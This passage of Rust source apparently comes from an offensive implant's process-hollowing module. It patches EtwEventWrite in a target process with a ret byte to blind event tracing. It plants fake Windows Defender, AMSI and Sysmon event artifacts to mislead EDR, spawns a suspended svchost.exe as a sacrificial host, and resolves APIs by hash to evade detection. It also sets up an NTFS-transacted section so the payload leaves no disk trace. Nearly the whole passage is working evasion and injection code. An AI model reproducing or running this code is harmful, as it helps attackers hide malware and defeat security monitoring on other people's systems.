        export_dir.as_mut_ptr() as u64,
        40u64,
        &mut bytes_read as *mut _ as u64,
    );
    if status.as_ref().map_or(true, |s| *s < 0) {
        return Err("failed to read export directory for ordinal resolve".to_string());
    }

    // IMAGE_EXPORT_DIRECTORY layout:
    //   offset 20: Base (DWORD) — ordinal base
    //   offset 24: NumberOfFunctions (DWORD)
    //   offset 28: NumberOfNames (DWORD)
    //   offset 32: AddressOfFunctions (DWORD)
    let base = u32::from_le_bytes([
        export_dir[20],
        export_dir[21],
        export_dir[22],
        export_dir[23],
    ]) as usize;
    let num_functions = u32::from_le_bytes([
        export_dir[24],
        export_dir[25],
        export_dir[26],
        export_dir[27],
    ]) as usize;
    let functions_rva = u32::from_le_bytes([
        export_dir[32],
        export_dir[33],
        export_dir[34],
        export_dir[35],
    ]) as usize;

    let index = ordinal.saturating_sub(base);
    if index >= num_functions {
        return Err(format!(
            "ordinal {} (index {}) out of range ({} functions, base {})",
            ordinal, index, num_functions, base
        ));
    }

    // Read function RVA from the table.
    let mut func_rva_buf = [0u32; 1];
    let status = crate::syscall!(
        "NtReadVirtualMemory",
        process_handle as u64,
        (module_base + functions_rva + index * 4) as u64,
        func_rva_buf.as_mut_ptr() as u64,
        4u64,
        &mut bytes_read as *mut _ as u64,
    );
    if status.as_ref().map_or(true, |s| *s < 0) {
        return Err("failed to read function RVA for ordinal resolve".to_string());
    }

    let func_rva = func_rva_buf[0] as usize;
    let dir_rva = export_dir_rva as usize;
    let dir_size = export_dir_size as usize;

    // Check for forwarder.
    if func_rva >= dir_rva && func_rva < dir_rva.saturating_add(dir_size) {
        return resolve_forwarded_remote_export(
            process_handle,
            module_base,
            func_rva,
            dir_rva,
            dir_size,
            0,
        );
    }

    Ok(module_base + func_rva)
}

/// Resolve an export by name in a remote module.
///
/// Reads the PE headers from the target process to walk the export table.
unsafe fn resolve_remote_export(
    process_handle: usize,
    module_base: usize,
    export_name: &[u8],
) -> Result<usize, String> {
    // Read DOS header.
    let mut dos_header = [0u8; 0x40];
    let mut bytes_read: usize = 0;
    let status = crate::syscall!(
        "NtReadVirtualMemory",
        process_handle as u64,
        module_base as u64,
        dos_header.as_mut_ptr() as u64,
        0x40u64,
        &mut bytes_read as *mut _ as u64,
    );
    if status.as_ref().map_or(true, |s| *s < 0) {
        return Err("failed to read DOS header from target".to_string());
    }
    if dos_header[0] != b'M' || dos_header[1] != b'Z' {
        return Err("invalid DOS signature in target".to_string());
    }

    let e_lfanew = u32::from_le_bytes([
        dos_header[0x3c],
        dos_header[0x3d],
        dos_header[0x3e],
        dos_header[0x3f],
    ]) as usize;

    // Read PE header + optional header.
    let pe_offset = e_lfanew;
    let mut pe_buf = [0u8; 0x100]; // Enough for PE sig + COFF + optional header
    let status = crate::syscall!(
        "NtReadVirtualMemory",
        process_handle as u64,
        (module_base + pe_offset) as u64,
        pe_buf.as_mut_ptr() as u64,
        0x100u64,
        &mut bytes_read as *mut _ as u64,
    );
    if status.as_ref().map_or(true, |s| *s < 0) {
        return Err("failed to read PE header from target".to_string());
    }

    // Verify PE signature.
    if pe_buf[0] != b'P' || pe_buf[1] != b'E' || pe_buf[2] != 0 || pe_buf[3] != 0 {
        return Err("invalid PE signature in target".to_string());
    }

    // Parse COFF header to get optional header size.
    let optional_header_size = u16::from_le_bytes([pe_buf[20], pe_buf[21]]) as usize;
    let optional_header_offset = 24; // PE sig (4) + COFF header (20)
    let export_dir_rva_offset = optional_header_offset + 112; // Export table RVA in optional header (PE32+)

    if pe_buf.len() < export_dir_rva_offset + 4 {
        return Err("PE buffer too small for export directory RVA".to_string());
    }

    let export_dir_rva = u32::from_le_bytes([
        pe_buf[export_dir_rva_offset],
        pe_buf[export_dir_rva_offset + 1],
        pe_buf[export_dir_rva_offset + 2],
        pe_buf[export_dir_rva_offset + 3],
    ]);
    let export_dir_size = u32::from_le_bytes([
        pe_buf[export_dir_rva_offset + 4],
        pe_buf[export_dir_rva_offset + 5],
        pe_buf[export_dir_rva_offset + 6],
        pe_buf[export_dir_rva_offset + 7],
    ]);

    if export_dir_rva == 0 {
        return Err("module has no export directory".to_string());
    }

    // Read export directory.
    let export_dir_addr = module_base + export_dir_rva as usize;
    let mut export_dir = [0u8; 40]; // IMAGE_EXPORT_DIRECTORY is 40 bytes
    let status = crate::syscall!(
        "NtReadVirtualMemory",
        process_handle as u64,
        export_dir_addr as u64,
        export_dir.as_mut_ptr() as u64,
        40u64,
        &mut bytes_read as *mut _ as u64,
    );
    if status.as_ref().map_or(true, |s| *s < 0) {
        return Err("failed to read export directory from target".to_string());
    }

    let num_names = u32::from_le_bytes([
        export_dir[24],
        export_dir[25],
        export_dir[26],
        export_dir[27],
    ]) as usize;
    let names_rva = u32::from_le_bytes([
        export_dir[32],
        export_dir[33],
        export_dir[34],
        export_dir[35],
    ]) as usize;
    let functions_rva = u32::from_le_bytes([
        export_dir[28],
        export_dir[29],
        export_dir[30],
        export_dir[31],
    ]) as usize;
    let ordinals_rva = u32::from_le_bytes([
        export_dir[36],
        export_dir[37],
        export_dir[38],
        export_dir[39],
    ]) as usize;

    // Read the name pointer table.
    let names_size = num_names * 4;
    let mut name_ptrs = vec![0u32; num_names];
    let status = crate::syscall!(
        "NtReadVirtualMemory",
        process_handle as u64,
        (module_base + names_rva) as u64,
        name_ptrs.as_mut_ptr() as u64,
        (names_size as u64),
        &mut bytes_read as *mut _ as u64,
    );
    if status.as_ref().map_or(true, |s| *s < 0) {
        return Err("failed to read export name pointers from target".to_string());
    }

    // Search for the export by name.
    let target_name = export_name;
    // Ensure null-terminated.
    let mut name_with_null = target_name.to_vec();
    if !name_with_null.ends_with(&[0]) {
        name_with_null.push(0);
    }

    for i in 0..num_names {
        let name_rva = name_ptrs[i] as usize;
        // Read the name (up to 128 bytes, stop at null).
        let mut name_buf = [0u8; 128];
        let status = crate::syscall!(
            "NtReadVirtualMemory",
            process_handle as u64,
            (module_base + name_rva) as u64,
            name_buf.as_mut_ptr() as u64,
            128u64,
            &mut bytes_read as *mut _ as u64,
        );
        if status.as_ref().map_or(true, |s| *s < 0) {
            continue;
        }

        // Find null terminator.
        let name_len = name_buf.iter().position(|&b| b == 0).unwrap_or(128);
        if &name_buf[..name_len] == &name_with_null[..name_with_null.len().saturating_sub(1)] {
            // Found it! Read the ordinal.
            let mut ordinal_buf = [0u16; 1];
            let status = crate::syscall!(
                "NtReadVirtualMemory",
                process_handle as u64,
                (module_base + ordinals_rva + i * 2) as u64,
                ordinal_buf.as_mut_ptr() as u64,
                2u64,
                &mut bytes_read as *mut _ as u64,
            );
            if status.as_ref().map_or(true, |s| *s < 0) {
                continue;
            }

            let ordinal = ordinal_buf[0] as usize;

            // Read the function RVA from the function table.
            let mut func_rva_buf = [0u32; 1];
            let status = crate::syscall!(
                "NtReadVirtualMemory",
                process_handle as u64,
                (module_base + functions_rva + ordinal * 4) as u64,
                func_rva_buf.as_mut_ptr() as u64,
                4u64,
                &mut bytes_read as *mut _ as u64,
            );
            if status.as_ref().map_or(true, |s| *s < 0) {
                continue;
            }

            let func_rva = func_rva_buf[0] as usize;

            // Check for export forwarder: if func_rva falls within the
            // export directory range, the RVA points to a null-terminated
            // ASCII forwarder string like "NTDLL.EtwEventWrite".
            let dir_rva = export_dir_rva as usize;
            let dir_size = export_dir_size as usize;
            if func_rva >= dir_rva && func_rva < dir_rva.saturating_add(dir_size) {
                return resolve_forwarded_remote_export(
                    process_handle,
                    module_base,
                    func_rva,
                    dir_rva,
                    dir_size,
                    0, // depth
                );
            }

            return Ok(module_base + func_rva);
        }
    }

    Err(format!(
        "export '{}' not found in remote module",
        String::from_utf8_lossy(export_name)
    ))
}

/// Patch EtwEventWrite in the target process by writing 0xC3 (ret) to the
/// first byte via NtWriteVirtualMemory.
unsafe fn patch_remote_etw(process_handle: usize) -> Result<EtwBlindingContext, String> {
    let remote_ntdll = find_remote_ntdll(process_handle)?;
    let etw_write_addr = resolve_remote_export(process_handle, remote_ntdll, b"EtwEventWrite")?;

    tracing::debug!(
        "injection_transacted: target EtwEventWrite at {:#x}",
        etw_write_addr
    );

    // Read the original first byte.
    let mut orig_byte = [0u8; 1];
    let mut bytes_read: usize = 0;
    let read_status = crate::syscall!(
        "NtReadVirtualMemory",
        process_handle as u64,
        etw_write_addr as u64,
        orig_byte.as_mut_ptr() as u64,
        1u64,
        &mut bytes_read as *mut _ as u64,
    );

    if read_status.as_ref().map_or(true, |s| *s < 0) {
        return Err("failed to read original EtwEventWrite byte from target".to_string());
    }

    let original_byte = orig_byte[0];

    // Skip if already patched.
    if original_byte == 0xC3 {
        tracing::debug!("injection_transacted: target EtwEventWrite already patched (0xC3)");
        return Ok(EtwBlindingContext {
            etw_write_addr,
            original_byte,
            process_handle,
            patched: false,
        });
    }

    // Make ntdll .text page writable so we can patch it.
    // Without this, NtWriteVirtualMemory fails with STATUS_ACCESS_DENIED on
    // PAGE_EXECUTE_READ memory.  Using PAGE_READWRITE (not RWX) — an RWX page
    // in ntdll is a top IoC for EDR products; RW is sufficient for the 1-byte
    // write and avoids the telemetry footprint.
    let mut protect_base: usize = etw_write_addr;
    let mut protect_size: usize = 1;
    let mut old_protect: u32 = 0;
    let protect_status = crate::syscall!(
        "NtProtectVirtualMemory",
        process_handle as u64,
        &mut protect_base as *mut _ as u64,
        &mut protect_size as *mut _ as u64,
        PAGE_READWRITE,
        &mut old_protect as *mut _ as u64,
    );

    if protect_status.as_ref().map_or(true, |s| *s < 0) {
        return Err(format!(
            "NtProtectVirtualMemory(RW) for ETW patch failed: status={:?}",
            protect_status
        ));
    }

    // Write the ret instruction (0xC3) via NtWriteVirtualMemory.
    let patch_byte: u8 = 0xC3;
    let mut bytes_written: usize = 0;
    let write_status = crate::syscall!(
        "NtWriteVirtualMemory",
        process_handle as u64,
        etw_write_addr as u64,
        &patch_byte as *const _ as u64,
        1u64,
        &mut bytes_written as *mut _ as u64,
    );

    // Restore original page protection regardless of write outcome.
    let mut restore_base: usize = etw_write_addr;
    let mut restore_size: usize = 1;
    let mut dummy_protect: u32 = 0;
    let _ = crate::syscall!(
        "NtProtectVirtualMemory",
        process_handle as u64,
        &mut restore_base as *mut _ as u64,
        &mut restore_size as *mut _ as u64,
        old_protect as u64,
        &mut dummy_protect as *mut _ as u64,
    );

    if write_status.as_ref().map_or(true, |s| *s < 0) {
        return Err(format!(
            "NtWriteVirtualMemory for ETW patch failed: status={:?}",
            write_status
        ));
    }

    tracing::debug!("injection_transacted: patched target EtwEventWrite with 0xC3");
    Ok(EtwBlindingContext {
        etw_write_addr,
        original_byte,
        process_handle,
        patched: true,
    })
}

/// Restore the original first byte of EtwEventWrite in the target process.
unsafe fn restore_remote_etw(ctx: &EtwBlindingContext) -> Result<(), String> {
    if !ctx.patched {
        return Ok(());
    }

    // Make ntdll .text page writable so we can restore the original byte.
    // PAGE_READWRITE is sufficient for the 1-byte write and avoids creating
    // an RWX page in ntdll (top EDR IoC).
    let mut protect_base: usize = ctx.etw_write_addr;
    let mut protect_size: usize = 1;
    let mut old_protect: u32 = 0;
    let protect_status = crate::syscall!(
        "NtProtectVirtualMemory",
        ctx.process_handle as u64,
        &mut protect_base as *mut _ as u64,
        &mut protect_size as *mut _ as u64,
        PAGE_READWRITE,
        &mut old_protect as *mut _ as u64,
    );

    if protect_status.as_ref().map_or(true, |s| *s < 0) {
        return Err(format!(
            "NtProtectVirtualMemory(RW) for ETW restore failed: status={:?}",
            protect_status
        ));
    }

    let mut bytes_written: usize = 0;
    let status = crate::syscall!(
        "NtWriteVirtualMemory",
        ctx.process_handle as u64,
        ctx.etw_write_addr as u64,
        &ctx.original_byte as *const _ as u64,
        1u64,
        &mut bytes_written as *mut _ as u64,
    );

    // Restore original page protection regardless of write outcome.
    let mut restore_base: usize = ctx.etw_write_addr;
    let mut restore_size: usize = 1;
    let mut dummy_protect: u32 = 0;
    let _ = crate::syscall!(
        "NtProtectVirtualMemory",
        ctx.process_handle as u64,
        &mut restore_base as *mut _ as u64,
        &mut restore_size as *mut _ as u64,
        old_protect as u64,
        &mut dummy_protect as *mut _ as u64,
    );

    if status.as_ref().map_or(true, |s| *s < 0) {
        return Err(format!(
            "failed to restore target EtwEventWrite: status={:?}",
            status
        ));
    }

    tracing::debug!("injection_transacted: restored target EtwEventWrite original byte");
    Ok(())
}

// ── Fake ETW event emission ──────────────────────────────────────────────────

/// Emit fake ETW events with spoofed provider GUIDs into the target process.
///
/// This is a best-effort blinding technique. We write fake event data to the
/// target process memory and call `EtwEventWrite` (via remote thread) if
/// ETW is not yet patched, or simply log the events locally for cover.
///
/// In practice, the main ETW blinding is the `patch_remote_etw()` call which
/// suppresses all future ETW events from the target. The fake events serve as
/// additional noise to confuse EDR correlation.
unsafe fn emit_fake_etw_events(process_handle: usize, remote_base: usize) -> Result<(), String> {
    // Prepare fake event data. These are written as a data block to the
    // target process for plausible memory artifacts.
    let fake_events: &[FakeEtwEvent] = &[
        // Windows Defender "threat scan started" event.
        FakeEtwEvent {
            provider_guid: &DEFENDER_PROVIDER_GUID,
            descriptor: EtwEventDescriptor {
                id: 1001,
                version: 1,
                channel: 0x0B, // Admin
                level: 0x04,   // Informational
                opcode: 1,
                task: 0,
                keyword: 0,
            },
            user_data: b"Windows Defender scan started",
        },
        // AMSI "scan completed" event (clean result).
        FakeEtwEvent {
            provider_guid: &AMSI_PROVIDER_GUID,
            descriptor: EtwEventDescriptor {
                id: 1101,
                version: 1,
                channel: 0x0B,
                level: 0x04,
                opcode: 2,
                task: 0,
                keyword: 0,
            },
            user_data: b"AMSI scan completed - clean",
        },
        // Sysmon "process create" event (legitimate svchost).
        FakeEtwEvent {
            provider_guid: &SYSMON_PROVIDER_GUID,
            descriptor: EtwEventDescriptor {
                id: 1,
                version: 5,
                channel: 0x0B,
                level: 0x04,
                opcode: 0,
                task: 1,
                keyword: 0x8000000000000000,
            },
            user_data: b"Process Create: svchost.exe -k netsvcs",
        },
        // Windows Defender "threat not found" event.
        FakeEtwEvent {
            provider_guid: &DEFENDER_PROVIDER_GUID,
            descriptor: EtwEventDescriptor {
                id: 1002,
                version: 1,
                channel: 0x0B,
                level: 0x04,
                opcode: 2,
                task: 0,
                keyword: 0,
            },
            user_data: b"Windows Defender scan completed - no threats",
        },
        // Sysmon "network connection" event (legitimate).
        FakeEtwEvent {
            provider_guid: &SYSMON_PROVIDER_GUID,
            descriptor: EtwEventDescriptor {
                id: 3,
                version: 5,
                channel: 0x0B,
                level: 0x04,
                opcode: 0,
                task: 3,
                keyword: 0x8000000000000000,
            },
            user_data: b"Network connection: svchost -> Microsoft update",
        },
    ];

    // Write the fake event provider GUIDs and event data into the target
    // process memory as artifacts. This creates plausible memory patterns
    // that EDR scanning may encounter and interpret as legitimate activity.
    let mut offset = 0usize;
    for event in fake_events {
        // Write provider GUID.
        let mut bytes_written: usize = 0;
        let guid_addr = remote_base + offset;
        let _ = crate::syscall!(
            "NtWriteVirtualMemory",
            process_handle as u64,
            guid_addr as u64,
            event.provider_guid.as_ptr() as u64,
            16u64,
            &mut bytes_written as *mut _ as u64,
        );
        offset += 16;

        // Write user data.
        let data_addr = remote_base + offset;
        let _ = crate::syscall!(
            "NtWriteVirtualMemory",
            process_handle as u64,
            data_addr as u64,
            event.user_data.as_ptr() as u64,
            event.user_data.len() as u64,
            &mut bytes_written as *mut _ as u64,
        );
        offset += event.user_data.len();

        // Align to 8 bytes.
        offset = (offset + 7) & !7;
    }

    tracing::debug!(
        "injection_transacted: wrote {} fake ETW event artifacts to target",
        fake_events.len()
    );
    Ok(())
}

// ── Process creation and manipulation ────────────────────────────────────────

/// Information about a created suspended process.
struct SuspendedProcess {
    process_handle: usize,
    thread_handle: usize,
    pid: u32,
    /// Base address of the process image in memory.
    image_base: usize,
    /// Entry point (AddressOfEntryPoint RVA + image base).
    entry_point: usize,
}

/// Create a sacrificial process in a suspended state.
///
/// Uses `CreateProcessW` with `CREATE_SUSPENDED` to spawn the process
/// without executing any code.
unsafe fn create_suspended_process(target_path: &[u16]) -> Result<SuspendedProcess, String> {
    use crate::win_types::{PROCESS_INFORMATION, STARTUPINFOW};

    // Dynamically resolve CreateProcessW from kernel32 to avoid IAT entry.
    let k32 = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_KERNEL32_DLL)
        .ok_or_else(|| "could not resolve kernel32 base".to_string())?;
    let cpw_addr =
        pe_resolve::get_proc_address_by_hash(k32, pe_resolve::hash_str(b"CreateProcessW\0"))
            .ok_or_else(|| "could not resolve CreateProcessW".to_string())?;
    type CreateProcessWFn = unsafe extern "system" fn(
        *mut u16,                 // lpApplicationName
        *mut u16,                 // lpCommandLine
        *mut c_void,              // lpProcessAttributes
        *mut c_void,              // lpThreadAttributes
        i32,                      // bInheritHandles
        u32,                      // dwCreationFlags
        *mut c_void,              // lpEnvironment
        *mut u16,                 // lpCurrentDirectory
        *mut STARTUPINFOW,        // lpStartupInfo
        *mut PROCESS_INFORMATION, // lpProcessInformation
    ) -> i32; // BOOL
    let create_proc_w: CreateProcessWFn = std::mem::transmute(cpw_addr);

    let mut startup_info: STARTUPINFOW = std::mem::zeroed();
    startup_info.cb = std::mem::size_of::<STARTUPINFOW>() as u32;
    let mut proc_info: PROCESS_INFORMATION = std::mem::zeroed();

    let success = create_proc_w(
        target_path.as_ptr() as *mut _,
        std::ptr::null_mut(),
        std::ptr::null_mut(),
        std::ptr::null_mut(),
        0,                       // bInheritHandles = FALSE
        CREATE_SUSPENDED as u32, // dwCreationFlags
        std::ptr::null_mut(),
        std::ptr::null_mut(),
        &mut startup_info,
        &mut proc_info,
    );

    if success == 0 {
        return Err(format!(
            "CreateProcessW failed for suspended process (error: {})",
            unsafe { get_last_error() }
        ));
    }

    let pid = proc_info.dwProcessId;
    let process_handle = proc_info.hProcess as usize;
    let thread_handle = proc_info.hThread as usize;

    // Read the PEB to get the image base address.
    // The PEB is accessible via the process handle.
    // For simplicity, we'll read the image base from the process memory.
    // On x86-64, the PEB is at the address stored in the thread's TEB.
    // The TEB's first member (except for exception list) at offset 0x60 is the PEB pointer.

    // Read the image base from the suspended process.
    // We'll use NtQueryInformationProcess to get the PEB address, then read ImageBaseAddress.
    let image_base = match read_process_image_base(process_handle) {
        Ok(ib) => ib,
        Err(e) => {
            let _ = crate::syscall!("NtTerminateProcess", process_handle as u64, 1u64);
            let _ = crate::syscall!("NtClose", process_handle as u64);
            let _ = crate::syscall!("NtClose", thread_handle as u64);
            return Err(e);
        }
    };
    let entry_point = match read_process_entry_point(process_handle, image_base) {
        Ok(ep) => ep,
        Err(e) => {
            let _ = crate::syscall!("NtTerminateProcess", process_handle as u64, 1u64);
            let _ = crate::syscall!("NtClose", process_handle as u64);
            let _ = crate::syscall!("NtClose", thread_handle as u64);
            return Err(e);
        }
    };

    tracing::debug!(
        "injection_transacted: created suspended process pid={}, image_base={:#x}, entry={:#x}",
        pid,
        image_base,
        entry_point
    );

    Ok(SuspendedProcess {
        process_handle,
        thread_handle,
        pid,
        image_base,
        entry_point,
    })
}

/// Read the image base address of a process from its PEB.
unsafe fn read_process_image_base(process_handle: usize) -> Result<usize, String> {
    // Use NtQueryInformationProcess(ProcessBasicInformation) to get the PEB address.
    let mut pbi: [usize; 6] = [0; 6]; // PROCESS_BASIC_INFORMATION
    let status = crate::syscall!(
        "NtQueryInformationProcess",
        process_handle as u64,
        0u64, // ProcessBasicInformation
        pbi.as_mut_ptr() as u64,
        (std::mem::size_of::<[usize; 6]>() as u64),
        0u64, // ReturnLength = NULL
    );

    if status.as_ref().map_or(true, |s| *s < 0) {
        return Err(format!(
            "NtQueryInformationProcess failed: status={:?}",
            status
        ));
    }

    // pbi[1] = PebBaseAddress
    let peb_addr = pbi[1];
    if peb_addr == 0 {
        return Err("PEB address is null".to_string());
    }

    // PEB.ImageBaseAddress is at offset 0x10 (x86-64).
    let mut image_base: usize = 0;
    let mut bytes_read: usize = 0;
    let read_status = crate::syscall!(
        "NtReadVirtualMemory",
        process_handle as u64,
        (peb_addr + 0x10) as u64,
        &mut image_base as *mut _ as u64,
        8u64,
        &mut bytes_read as *mut _ as u64,
    );

    if read_status.as_ref().map_or(true, |s| *s < 0) || image_base == 0 {
        return Err(format!(
            "failed to read ImageBaseAddress from PEB: status={:?}",
            read_status
        ));
    }

    Ok(image_base)
}

/// Read the entry point of the process's main image.
unsafe fn read_process_entry_point(
    process_handle: usize,
    image_base: usize,
) -> Result<usize, String> {
    // Read the DOS header to get e_lfanew.
    let mut dos_header = [0u8; 0x40];
    let mut bytes_read: usize = 0;
    let status = crate::syscall!(
        "NtReadVirtualMemory",
        process_handle as u64,
        image_base as u64,
        dos_header.as_mut_ptr() as u64,
        0x40u64,
        &mut bytes_read as *mut _ as u64,
    );
    if status.as_ref().map_or(true, |s| *s < 0) {
        return Err("failed to read DOS header".to_string());
    }

    let e_lfanew = u32::from_le_bytes([
        dos_header[0x3c],
        dos_header[0x3d],
        dos_header[0x3e],
        dos_header[0x3f],
    ]) as usize;

    // Read the PE optional header to get AddressOfEntryPoint.
    // AddressOfEntryPoint is at offset e_lfanew + 0x28 (PE32+).
    let mut entry_rva_buf = [0u8; 4];
    let status = crate::syscall!(
        "NtReadVirtualMemory",
        process_handle as u64,
        (image_base + e_lfanew + 0x28) as u64,
        entry_rva_buf.as_mut_ptr() as u64,
        4u64,
        &mut bytes_read as *mut _ as u64,
    );
    if status.as_ref().map_or(true, |s| *s < 0) {
        return Err("failed to read AddressOfEntryPoint".to_string());
    }

    let entry_rva = u32::from_le_bytes(entry_rva_buf) as usize;
    Ok(image_base + entry_rva)
}

/// Get the sacrificial process path.
///
/// If `target_process` is `Some(name)`, resolves it to a full NT path via
/// `C:\Windows\System32\<name>`.  Otherwise falls back to the default
/// `C:\Windows\System32\svchost.exe`.
fn get_sacrificial_path(target_process: Option<&str>) -> Vec<u16> {
    let path = match target_process {
        Some(name) => {
            // Build C:\Windows\System32\<name> from the caller-supplied name.
            let mut full = String::from(r"C:\Windows\System32\");
            full.push_str(name);
            full
        }
        None => r"C:\Windows\System32\svchost.exe".to_string(),
    };
    path.encode_utf16().chain(std::iter::once(0)).collect()
}

// ── Section creation and mapping ─────────────────────────────────────────────

/// Minimal OBJECT_ATTRIBUTES for NtCreateFile (x86-64 layout).
#[repr(C)]
struct NtObjAttr {
    length: u32,
    root_directory: usize,
    object_name: usize,
    attributes: u32,
    security_descriptor: usize,
    security_quality_of_service: usize,
}

/// Minimal UNICODE_STRING (x86-64 layout).
#[repr(C)]
struct NtUnicodeStr {
    length: u16,
    maximum_length: u16,
    buffer: usize,
}

/// Minimal IO_STATUS_BLOCK (x86-64 layout).
#[repr(C)]
struct NtIoStatusBlock {
    status: usize,
    information: usize,
}

/// Counter for generating unique temp-file names.
static TEMP_FILE_COUNTER: std::sync::atomic::AtomicU32 = std::sync::atomic::AtomicU32::new(0);

/// Create a section backed by an NTFS transaction.
///
/// Implements true transacted hollowing:
///
/// 1. Builds a temporary file NT path (`\??\C:\Windows\Temp\~tmpXXXX.tmp`)
///    with a randomised suffix.
/// 2. Sets the thread's KTM transaction context via `RtlSetCurrentTransaction`,
///    which enlists subsequent file I/O into the transaction.
/// 3. Creates the temp file **within** the transaction and writes placeholder
///    data so the file has the right size for the section.
/// 4. Clears the thread's transaction context.
/// 5. Calls `NtCreateSection` with the transacted file handle as `FileHandle` —
///    the section is now backed by the transacted file.
/// 6. Closes the file handle (the section holds its own reference).
///
/// After the section is mapped into the target process and the payload is
/// written, `NtRollbackTransaction` will:
/// - Roll back the transaction, which **deletes the temp file from disk**.
/// - The section mapping in the target process **persists** because NT keeps
///   the section data in memory even after the on-disk file is rolled back.
/// - This is the core OPSEC value: **no disk artifacts remain**.
unsafe fn create_transacted_section(
    tx_handle: usize,
    payload_size: usize,
) -> Result<usize, String> {
    let aligned_size = page_align(payload_size);

    // ── Step 1: Bind transaction to current thread ───────────────────
    // This enlists all subsequent file I/O on this thread into the
    // transaction.  The correct NT mechanism — do NOT place the tx handle
    // in OBJECT_ATTRIBUTES.RootDirectory (that is a directory handle field).
    set_current_transaction(tx_handle)
        .map_err(|e| format!("set_current_transaction failed: {}", e))?;

    // ── Step 2: Build temp file NT path ─────────────────────────────
    // Path: \??\C:\Windows\Temp\~tmpXXXX.tmp  (randomised suffix)
    let base_path =
        String::from_utf8_lossy(&string_crypt::enc_str!("\\??\\C:\\Windows\\Temp\\~tmp"))
            .trim_end_matches('\0')
            .to_string();

    let counter = TEMP_FILE_COUNTER.fetch_add(1, std::sync::atomic::Ordering::Relaxed);
    let suffix = format!("{:04x}", counter & 0xFFFF);
    let full_path_str = format!("{}{}.tmp\0", base_path, suffix);
    let full_path: Vec<u16> = full_path_str.encode_utf16().collect();

    // Build UNICODE_STRING for the file path.
    let byte_len = (full_path.len() - 1) * 2; // exclude trailing null
    let mut uni_name = NtUnicodeStr {
        length: byte_len as u16,
        maximum_length: (byte_len + 2) as u16,
        buffer: full_path.as_ptr() as usize,
    };

    // Build OBJECT_ATTRIBUTES — RootDirectory is 0 (no directory handle).
    // The transaction binding is done via the thread's KTM context, not here.
    let mut oa = NtObjAttr {
        length: std::mem::size_of::<NtObjAttr>() as u32,
        root_directory: 0,
        object_name: &mut uni_name as *mut _ as usize,
        attributes: OBJ_CASE_INSENSITIVE,
        security_descriptor: 0,
        security_quality_of_service: 0,
    };

    // ── Step 2: Create the temp file within the transaction ─────────
    let mut file_handle: usize = 0;
    let mut iosb = NtIoStatusBlock {
        status: 0,
        information: 0,
    };

    // DesiredAccess: GENERIC_WRITE | SYNCHRONIZE
    // CreateDisposition: FILE_SUPERSEDE
    // CreateOptions: FILE_SYNCHRONOUS_IO_NONALERT | FILE_NON_DIRECTORY_FILE
    let create_file_status = crate::syscall!(
        "NtCreateFile",
        &mut file_handle as *mut _ as u64,    // FileHandle
        (GENERIC_WRITE | SYNCHRONIZE) as u64, // DesiredAccess
        &mut oa as *mut _ as u64,             // ObjectAttributes
        &mut iosb as *mut _ as u64,           // IoStatusBlock
        0u64,                                 // AllocationSize = NULL
        FILE_ATTRIBUTE_NORMAL as u64,         // FileAttributes
        0u64,                                 // ShareAccess = none
        FILE_SUPERSEDE as u64,                // CreateDisposition
        (FILE_SYNCHRONOUS_IO_NONALERT | FILE_NON_DIRECTORY_FILE) as u64, // CreateOptions
        0u64,                                 // EaLength = 0
        0u64,                                 // EaBuffer = NULL
    );

    if create_file_status.as_ref().map_or(true, |s| *s < 0) || file_handle == 0 {
        let _ = set_current_transaction(0);
        return Err(format!(
            "NtCreateFile for transacted temp file failed: status={:?}",
            create_file_status
        ));
    }

    tracing::debug!(
        "injection_transacted: created transacted temp file handle={:#x}",
        file_handle
    );

    // ── Step 3: Write placeholder data to the file ──────────────────
    // The file needs to be at least `aligned_size` so the section can map it.
    let zero_buf = vec![0u8; aligned_size];
    let mut iosb2 = NtIoStatusBlock {
        status: 0,
        information: 0,
    };

    let write_status = crate::syscall!(
        "NtWriteFile",
        file_handle as u64,          // FileHandle
        0u64,                        // Event = NULL
        0u64,                        // ApcRoutine = NULL
        0u64,                        // ApcContext = NULL
        &mut iosb2 as *mut _ as u64, // IoStatusBlock
        zero_buf.as_ptr() as u64,    // Buffer
        zero_buf.len() as u64,       // Length
        0u64,                        // ByteOffset = NULL
        0u64,                        // Key = NULL
    );

    if write_status.as_ref().map_or(true, |s| *s < 0) {
        let _ = crate::syscall!("NtClose", file_handle as u64);
        let _ = set_current_transaction(0);
        return Err(format!(
            "NtWriteFile for transacted temp file failed: status={:?}",
            write_status
        ));
    }

    // ── Step 4: Create section backed by the transacted file ────────
    let mut large_size: i64 = aligned_size as i64;
    let mut h_section: usize = 0;

    // SectionPageProtection = PAGE_READWRITE.  The payload is written via a
    // local RW mapping (write_payload_to_section), then mapped into the target
    // as PAGE_EXECUTE_READ (map_section_to_target).  Using RWX here would
    // create an RWX section object that is visible to EDR even if the target
    // mapping is RX.
    let create_section_status = crate::syscall!(
        "NtCreateSection",
        &mut h_section as *mut _ as u64,  // SectionHandle
        SECTION_ALL_ACCESS,               // DesiredAccess
        0u64,                             // ObjectAttributes = NULL
        &mut large_size as *mut _ as u64, // MaximumSize
        PAGE_READWRITE,                   // SectionPageProtection
        SEC_COMMIT,                       // AllocationAttributes
        file_handle as u64,               // FileHandle (transacted file)
    );

    // ── Step 5: Close file handle (section holds its own reference) ──
    let _ = crate::syscall!("NtClose", file_handle as u64);

    // ── Step 6: Clear the thread's transaction context ───────────────
    // All transacted file I/O is complete.  The section now holds a
    // reference to the transacted data — further operations on this
    // thread should NOT be enlisted in the transaction.
    let _ = set_current_transaction(0);

    if create_section_status.as_ref().map_or(true, |s| *s < 0) || h_section == 0 {
        return Err(format!(
            "NtCreateSection for transacted section failed: status={:?}",
            create_section_status
        ));
    }

    tracing::debug!(
        "injection_transacted: created transacted section handle={:#x}, size={}",
        h_section,
        aligned_size
    );
    Ok(h_section)
}

/// Map a section into the current process with PAGE_READWRITE and write the payload.
unsafe fn write_payload_to_section(h_section: usize, payload: &[u8]) -> Result<(), String> {
    let mut local_base: *mut c_void = std::ptr::null_mut();
    let mut view_size: usize = 0;

    let map_status = crate::syscall!(
        "NtMapViewOfSection",
        h_section as u64,
        CURRENT_PROCESS, // NtCurrentProcess()
        &mut local_base as *mut _ as u64,
        0u64, // ZeroBits
        0u64, // CommitSize
        0u64, // SectionOffset = NULL
        &mut view_size as *mut _ as u64,
        2u64, // ViewUnmap
        0u64, // AllocationType
        PAGE_READWRITE,
    );

    if map_status.as_ref().map_or(true, |s| *s < 0) || local_base.is_null() {
        let _ = crate::syscall!("NtClose", h_section as u64);
        return Err(format!(
            "NtMapViewOfSection(local RW) failed: status={:?}",
            map_status
        ));
    }

